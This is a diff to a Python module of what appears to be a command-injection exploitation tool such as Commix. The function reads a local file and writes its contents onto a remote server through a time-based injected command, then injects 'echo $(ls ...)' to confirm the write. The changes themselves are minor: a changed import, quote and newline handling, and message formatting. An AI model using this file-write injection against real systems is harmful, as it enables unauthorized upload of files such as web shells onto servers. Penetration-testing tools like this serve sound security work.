@@ -14,8 +14,8 @@
  For more see the file 'readme/COPYING' for copying permission.
 """
 
+import os
 import sys
-import os.path
 
 from src.utils import menu
 from src.utils import colors
@@ -53,10 +53,12 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     if not os.path.exists(file_to_write):
       sys.stdout.write(colors.BGRED + "\n(x) Error: It seems that the '"+ file_to_write + "' is not exists." + colors.RESET)
       sys.stdout.flush()
+      sys.exit(0)
+      
     if os.path.isfile(file_to_write):
       with open(file_to_write, 'r') as content_file:
-	content = [line.rstrip('\n') for line in content_file]
-      content = "".join(str(p) for p in content)
+	content = [line.replace("\n", " ") for line in content_file]
+      content = "".join(str(p) for p in content).replace("'","\"")
     else:
       sys.stdout.write(colors.BGRED + "\n(x) Error: It seems that '"+ file_to_write + "' is not a file." + colors.RESET)
       sys.stdout.flush()
@@ -67,6 +69,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     else:
       dest_to_write = menu.options.file_dest
     cmd = settings.FILE_WRITE + " '"+ content + "' "
+    
     # Check the file-destination
     if os.path.split(menu.options.file_dest)[1] == "" :
       dest_to_write = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_write)[1]
@@ -78,6 +81,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
     shell = output
     shell = "".join(str(p) for p in shell)
+    
     # Check if file exists!
     cmd = "echo $(ls " + dest_to_write + ")"
     check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
@@ -86,10 +90,10 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     if shell:
       if menu.options.verbose:
 	print ""
-      sys.stdout.write(colors.BOLD + "(!) The " + colors.UNDERL + shell + colors.RESET + colors.BOLD +" file was created successfully!\n" + colors.RESET)
+      sys.stdout.write(colors.BOLD + "\n(!) The " + colors.UNDERL + shell + colors.RESET + colors.BOLD +" file was created successfully!\n" + colors.RESET)
       sys.stdout.flush()
     else:
-     sys.stdout.write(colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file.\n" + colors.RESET)
+     sys.stdout.write(colors.BGRED + "\n(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file.\n" + colors.RESET)
      sys.stdout.flush()
 
 # eof
